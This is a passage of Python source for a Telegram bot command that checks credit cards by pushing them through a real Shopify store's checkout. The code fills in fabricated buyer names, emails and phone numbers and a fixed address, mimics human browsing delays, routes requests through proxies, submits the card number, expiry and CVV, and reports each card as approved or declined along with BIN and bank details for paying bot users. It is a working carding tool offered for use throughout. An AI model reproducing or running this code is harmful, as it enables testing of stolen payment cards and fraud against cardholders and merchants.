                logger.success("Checkout page loaded")
                return True, "Checkout data loaded"
            else:
                logger.warning(f"Checkout page failed: {response.status_code}")
                return True, f"Checkout page failed but continuing: {response.status_code}"
                
        except Exception as e:
            logger.warning(f"Checkout data error but continuing: {str(e)}")
            return True, f"Checkout data error but continuing: {str(e)}"

    def generate_session_token(self):
        """Generate session token"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(100))

    async def fill_shipping_info(self, client):
        """Fill shipping information - Always use pickup"""
        try:
            logger.step(6, 8, "Filling shipping info...")
            
            if not self.checkout_token:
                # Create user info without checkout
                return True, self.create_user_info()
            
            # Generate user info
            first_name, last_name = self.generate_name()
            email = self.generate_email()
            phone = self.generate_phone()
            
            # Update address with phone
            self.fixed_address['phone'] = phone
            
            user_info = {
                'first_name': first_name,
                'last_name': last_name,
                'email': email,
                'phone': phone,
                'address': self.fixed_address
            }
            
            # Try to update shipping info (optional)
            try:
                shipping_url = f"{self.base_url}/checkouts/{self.checkout_token}/shipping_rates.json"
                
                shipping_data = {
                    "shipping_address": {
                        "first_name": first_name,
                        "last_name": last_name,
                        "address1": self.fixed_address['address1'],
                        "address2": self.fixed_address['address2'],
                        "city": self.fixed_address['city'],
                        "province": self.fixed_address['state'],
                        "zip": self.fixed_address['zip'],
                        "country": self.fixed_address['country'],
                        "phone": phone
                    },
                    "email": email
                }
                
                shipping_headers = self.get_shopify_headers(
                    referer=f"{self.base_url}/checkouts/{self.checkout_token}"
                )
                shipping_headers['Content-Type'] = 'application/json'
                
                await self.make_request(
                    client, 'POST', shipping_url,
                    json=shipping_data,
                    headers=shipping_headers
                )
                
                logger.success("Shipping info submitted")
            except Exception as e:
                logger.warning(f"Shipping info submission skipped: {str(e)}")
            
            return True, user_info
                
        except Exception as e:
            logger.warning(f"Shipping info error, creating basic user info: {str(e)}")
            return True, self.create_user_info()

    def create_user_info(self):
        """Create user info without shipping submission"""
        first_name, last_name = self.generate_name()
        email = self.generate_email()
        phone = self.generate_phone()
        
        return {
            'first_name': first_name,
            'last_name': last_name,
            'email': email,
            'phone': phone,
            'address': self.fixed_address
        }

    async def submit_payment(self, client, card_details, user_info):
        """Submit payment with card details - VPS optimized"""
        try:
            logger.step(7, 8, "Submitting payment...")
            
            if not self.checkout_token:
                return False, "CHECKOUT_ERROR: No checkout token"
            
            cc, mes, ano, cvv = card_details
            
            # Try multiple payment methods
            payment_methods = [
                self.submit_payment_direct,
                self.submit_payment_simple
            ]
            
            for method in payment_methods:
                try:
                    success, result = await method(client, cc, mes, ano, cvv, user_info)
                    if success:
                        return success, result
                    else:
                        logger.warning(f"Payment method failed: {result}")
                except Exception as e:
                    logger.warning(f"Payment method error: {str(e)}")
                    continue
            
            return False, "PAYMENT_ERROR: All payment methods failed"
                
        except Exception as e:
            error_type = self.detect_error_type(str(e))
            return False, f"{error_type}: {str(e)[:100]}"

    async def submit_payment_direct(self, client, cc, mes, ano, cvv, user_info):
        """Direct payment submission"""
        payment_url = f"{self.base_url}/checkouts/{self.checkout_token}/payments.json"
        
        payment_data = {
            "payment": {
                "unique_token": self.generate_session_token()[:32],
                "payment_token": f"shopify_payments_{int(time.time())}",
                "credit_card": {
                    "number": cc.replace(' ', ''),
                    "name": f"{user_info['first_name']} {user_info['last_name']}",
                    "month": mes,
                    "year": ano[-2:],
                    "verification_value": cvv
                },
                "billing_address": {
                    "first_name": user_info['first_name'],
                    "last_name": user_info['last_name'],
                    "address1": user_info['address']['address1'],
                    "address2": user_info['address']['address2'],
                    "city": user_info['address']['city'],
                    "province": user_info['address']['state'],
                    "zip": user_info['address']['zip'],
                    "country": user_info['address']['country'],
                    "phone": user_info['phone']
                }
            }
        }
        
        payment_headers = self.get_shopify_headers(
            referer=f"{self.base_url}/checkouts/{self.checkout_token}"
        )
        payment_headers['Content-Type'] = 'application/json'
        
        response = await self.make_request(
            client, 'POST', payment_url,
            json=payment_data,
            headers=payment_headers
        )
        
        if response.status_code == 200:
            result = response.json()
            
            if 'error' in result:
                error_msg = result['error']
                error_type = self.detect_error_type(error_msg)
                return False, f"{error_type}: {self.clean_error_message(error_msg)}"
            
            if 'transaction' in result:
                transaction = result['transaction']
                if transaction.get('status') == 'success':
                    logger.success("Payment successful")
                    return True, "Payment successful"
                else:
                    error_msg = transaction.get('message', 'Payment failed')
                    error_type = self.detect_error_type(error_msg)
                    return False, f"{error_type}: {self.clean_error_message(error_msg)}"
            
            return False, "TRANSACTION_ERROR: No transaction data"
        
        elif response.status_code == 422:
            try:
                error_data = response.json()
                error_msg = error_data.get('error', 'Validation error')
                error_type = self.detect_error_type(error_msg)
                return False, f"{error_type}: {self.clean_error_message(error_msg)}"
            except:
                return False, "VALIDATION_ERROR: Payment validation failed"
        
        else:
            return False, f"SERVER_ERROR: Status {response.status_code}"

    async def submit_payment_simple(self, client, cc, mes, ano, cvv, user_info):
        """Simple payment submission with minimal data"""
        payment_url = f"{self.base_url}/checkouts/{self.checkout_token}/payments.json"
        
        payment_data = {
            "payment": {
                "credit_card": {
                    "number": cc.replace(' ', ''),
                    "name": f"{user_info['first_name']} {user_info['last_name']}",
                    "month": mes,
                    "year": ano[-2:],
                    "verification_value": cvv
                }
            }
        }
        
        payment_headers = self.get_shopify_headers(
            referer=f"{self.base_url}/checkouts/{self.checkout_token}"
        )
        payment_headers['Content-Type'] = 'application/json'
        
        response = await self.make_request(
            client, 'POST', payment_url,
            json=payment_data,
            headers=payment_headers
        )
        
        if response.status_code == 200:
            result = response.json()
            
            if 'error' in result:
                error_msg = result['error']
                error_type = self.detect_error_type(error_msg)
                return False, f"{error_type}: {self.clean_error_message(error_msg)}"
            
            if 'transaction' in result:
                transaction = result['transaction']
                if transaction.get('status') == 'success':
                    return True, "Payment successful"
                else:
                    error_msg = transaction.get('message', 'Payment failed')
                    error_type = self.detect_error_type(error_msg)
                    return False, f"{error_type}: {self.clean_error_message(error_msg)}"
            
            return False, "TRANSACTION_ERROR: No transaction data"
        
        return False, f"SIMPLE_PAYMENT_ERROR: Status {response.status_code}"

    async def complete_checkout(self, client):
        """Complete the checkout - Simplified for VPS"""
        try:
            logger.step(8, 8, "Completing checkout...")
            
            if not self.checkout_token:
                return True, "Checkout completed (no token)"
            
            # Simple completion attempt
            try:
                complete_url = f"{self.base_url}/checkouts/{self.checkout_token}/complete"
                
                complete_headers = self.get_shopify_headers(
                    referer=f"{self.base_url}/checkouts/{self.checkout_token}"
                )
                
                response = await self.make_request(
                    client, 'POST', complete_url,
                    headers=complete_headers,
                    data={'note': '', 'tip': '0'}
                )
                
                if response.status_code in [200, 302]:
                    logger.success("Checkout completion attempted")
                    return True, "Checkout completion attempted"
            except:
                pass
            
            return True, "Checkout process completed"
                
        except Exception as e:
            return True, f"Checkout completion skipped: {str(e)[:50]}"

    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None):
        """Format response message"""
        if bin_info is None:
            bin_info = await self.get_bin_info(cc)

        user_id = user_data.get("user_id", "Unknown")
        first_name = html.escape(user_data.get("first_name", "User"))
        badge = user_data.get("plan", {}).get("badge", "🧿")

        # Clean error message
        if ":" in message:
            error_parts = message.split(":", 1)
            if len(error_parts) > 1:
                error_type = error_parts[0].strip()
                error_msg = error_parts[1].strip()
                message_display = f"{error_type}: {error_msg}"
            else:
                message_display = message
        else:
            message_display = message

        if status == "APPROVED":
            status_emoji = "✅"
            status_text = "APPROVED"
        elif "CARD_DECLINED" in message or "DECLINED" in message.upper():
            status_emoji = "❌"
            status_text = "DECLINED"
        elif "3D_SECURE" in message or "AUTHENTICATION" in message.upper():
            status_emoji = "🛡️"
            status_text = "3D SECURE"
        elif "CAPTCHA" in message:
            status_emoji = "🤖"
            status_text = "CAPTCHA"
        elif "FRAUD" in message:
            status_emoji = "🚫"
            status_text = "FRAUD"
        elif "INSUFFICIENT" in message:
            status_emoji = "💰"
            status_text = "INSUFFICIENT FUNDS"
        else:
            status_emoji = "❌"
            status_text = "DECLINED"

        clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
        user_display = f"「{badge}」{clean_name}"
        bank_info = bin_info['bank'].upper() if bin_info['bank'] != 'N/A' else 'N/A'

        response = f"""<b>「$cmd → /sh」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Shopify Charge
<b>[•] Status-</b> <code>{status_text} {status_emoji}</code>
<b>[•] Response-</b> <code>{message_display}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin:</b> <code>{cc[:6]}</code>  
<b>[+] Info:</b> <code>{bin_info['scheme']} - {bin_info['type']} - {bin_info['brand']}</code>
<b>[+] Bank:</b> <code>{bank_info}</code> 🏦
<b>[+] Country:</b> <code>{bin_info['country']}</code> [{bin_info['emoji']}]
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By:</b> {user_display}
<b>[ϟ] Dev ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t:</b> <code>{elapsed_time:.2f} 𝐬</code> |<b>P/x:</b> <code>Live ⚡️</code></b>"""

        return response

    async def check_card(self, card_details, username, user_data):
        """Main card checking method optimized for VPS"""
        start_time = time.time()
        logger.info(f"🔍 Starting Shopify Charge check: {card_details[:12]}XXXX{card_details[-4:] if len(card_details) > 4 else ''}")
        
        try:
            # Parse card details
            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                return await self.format_response("", "", "", "", "ERROR", "Invalid card format. Use: CC|MM|YY|CVV", username, time.time()-start_time, user_data)

            cc = cc_parts[0].strip().replace(" ", "")
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()

            # Validate card details
            if not cc.isdigit() or len(cc) < 15:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid card number", username, time.time()-start_time, user_data)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid month", username, time.time()-start_time, user_data)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid year", username, time.time()-start_time, user_data)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid CVV", username, time.time()-start_time, user_data)

            if len(ano) == 2:
                ano = '20' + ano

            # Get BIN info
            bin_info = await self.get_bin_info(cc)
            logger.bin_info(f"BIN: {cc[:6]} | {bin_info['scheme']} - {bin_info['type']} | {bin_info['bank']} | {bin_info['country']} [{bin_info['emoji']}]")

            # Create HTTP client with proxy if available
            client_params = {
                'timeout': 30.0,
                'follow_redirects': True,
                'limits': httpx.Limits(max_keepalive_connections=5, max_connections=10),
                'http2': True,
                'verify': False  # Disable SSL verification for VPS compatibility
            }
            
            if self.current_proxy:
                proxy_url = str(self.current_proxy)
                client_params['proxy'] = proxy_url
                logger.proxy(f"Using proxy: {proxy_url[:50]}...")

            async with httpx.AsyncClient(**client_params) as client:
                # Step 1: Browse store
                success, error = await self.browse_store(client)
                if not success:
                    logger.warning(f"Store browsing warning: {error}")
                # Continue even if store browsing has minor issues

                await self.human_delay(1, 3)

                # Step 2: View product
                success, error = await self.view_product(client)
                if not success:
                    logger.warning(f"Product view warning: {error}")

                await self.human_delay(1, 3)

                # Step 3: Add to cart (V2 method with multiple techniques)
                success, error = await self.add_to_cart_v2(client)
                if not success:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Add to cart failed: {error}", username, time.time()-start_time, user_data, bin_info)

                await self.human_delay(1, 3)

                # Step 4: Go to checkout (V2 method)
                success, error = await self.go_to_checkout_v2(client)
                if not success:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Checkout failed: {error}", username, time.time()-start_time, user_data, bin_info)

                await self.human_delay(1, 3)

                # Step 5: Get checkout data
                success, data_or_error = await self.get_checkout_data(client)
                if not success:
                    logger.warning(f"Checkout data warning: {data_or_error}")

                await self.human_delay(1, 3)

                # Step 6: Fill shipping info
                success, user_info_or_error = await self.fill_shipping_info(client)
                if not success:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Shipping failed: {user_info_or_error}", username, time.time()-start_time, user_data, bin_info)

                user_info = user_info_or_error
                await self.human_delay(1, 3)

                # Step 7: Submit payment
                success, payment_result = await self.submit_payment(client, (cc, mes, ano, cvv), user_info)
                
                elapsed_time = time.time() - start_time
                
                if success:
                    logger.success(f"Payment successful in {elapsed_time:.2f}s")
                    # Step 8: Complete checkout
                    complete_success, complete_result = await self.complete_checkout(client)
                    if complete_success:
                        return await self.format_response(cc, mes, ano, cvv, "APPROVED", "Successfully Charged", username, elapsed_time, user_data, bin_info)
                    else:
                        return await self.format_response(cc, mes, ano, cvv, "APPROVED", f"Charged: {complete_result}", username, elapsed_time, user_data, bin_info)
                else:
                    logger.error(f"Payment failed: {payment_result}")
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", payment_result, username, elapsed_time, user_data, bin_info)

        except httpx.TimeoutException:
            logger.error("Request timeout")
            elapsed_time = time.time() - start_time
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "TIMEOUT_ERROR: Request timeout", username, elapsed_time, user_data, bin_info)
        except httpx.ConnectError:
            logger.error("Connection error")
            elapsed_time = time.time() - start_time
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "CONNECTION_ERROR: Connection failed", username, elapsed_time, user_data, bin_info)
        except Exception as e:
            logger.error(f"Unexpected error: {str(e)}")
            elapsed_time = time.time() - start_time
            error_type = self.detect_error_type(str(e))
            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"{error_type}: {str(e)[:80]}", username, elapsed_time, user_data, bin_info)

# Command handler
@Client.on_message(filters.command(["sh", ".sh", "$sh"]))
@auth_and_free_restricted
async def handle_shopify_charge(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        # CHECK: First check if command is disabled
        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        # Check if user is banned
        if is_user_banned(user_id):
            await message.reply("""<pre>⛔ User Banned</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You have been banned from using this bot.
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        # Load user data
        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>🔒 Registration Required</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You need to register first with /register
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        # Check cooldown
        can_use, wait_time = check_cooldown(user_id, "sh")
        if not can_use:
            await message.reply(f"""<pre>⏳ Cooldown Active</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
⟐ <b>Your Plan:</b> <code>{plan_name}</code>
⟐ <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            if charge_processor:
                await message.reply(charge_processor.get_usage_message(
                    "sh", 
                    "Shopify Charge",
                    "4111111111111111|12|2025|123"
                ))
            else:
                await message.reply("""<pre>#WAYNE ─[SHOPIFY CHARGE]─</pre>
━━━━━━━━━━━━━
⟐ <b>Command</b>: <code>/sh</code> or <code>.sh</code> or <code>$sh</code>
⟐ <b>Usage</b>: <code>/sh cc|mm|yy|cvv</code>
⟐ <b>Example</b>: <code>/sh 4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Charges via Shopify gateway (Deducts 2 credits AFTER check completes)</code>
<b>~ Note:</b> <code>Free users can use in authorized groups with credit deduction</code>
<b>~ Store:</b> <code>meta-app-prod-store-1.myshopify.com</code>
<b>~ Product:</b> <code>retailer-id-fix-no-mapping</code>
<b>~ Address:</b> <code>8 Log Pond Drive, Horsham PA 19044</code>
<b>~ Shipping:</b> <code>Local Pickup</code>
<b>~ Tip:</b> <code>None</code>
<b>~ VPS:</b> <code>Optimized for Ubuntu VPS systems</code>""")
            return

        card_details = args[1].strip()

        cc_parts = card_details.split('|')
        if len(cc_parts) < 4:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Invalid card format.
⟐ <b>Correct Format</b>: <code>cc|mm|yy|cvv</code>
⟐ <b>Example</b>: <code>4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━""")
            return

        cc = cc_parts[0]
        mes = cc_parts[1]
        ano = cc_parts[2]
        cvv = cc_parts[3]

        # Show processing message
        processing_msg = await message.reply(
            charge_processor.get_processing_message(
                cc, mes, ano, cvv, username, plan_name, 
                "Shopify Charge", "sh"
            ) if charge_processor else f"""<b>「$cmd → /sh」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Shopify Charge
<b>[•] Status-</b> Processing... ⏳
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
<b>[+] Store:</b> meta-app-prod-store-1.myshopify.com
<b>[+] VPS:</b> Ubuntu Optimized
━━━━━━━━━━━━━━━
<b>Checking card... Please wait.</b>"""
        )

        # Create checker instance
        checker = ShopifyChargeChecker(user_id)

        # Process command through universal charge processor
        if charge_processor:
            success, result, credits_deducted = await charge_processor.execute_charge_command(
                user_id,
                checker.check_card,
                card_details,
                username,
                user_data,
                credits_needed=2,
                command_name="sh",
                gateway_name="Shopify Charge"
            )

            await processing_msg.edit_text(result, disable_web_page_preview=True)
        else:
            result = await checker.check_card(card_details, username, user_data)
            await processing_msg.edit_text(result, disable_web_page_preview=True)

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: An error occurred while processing your request.
⟐ <b>Error</b>: <code>{error_msg}</code>
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
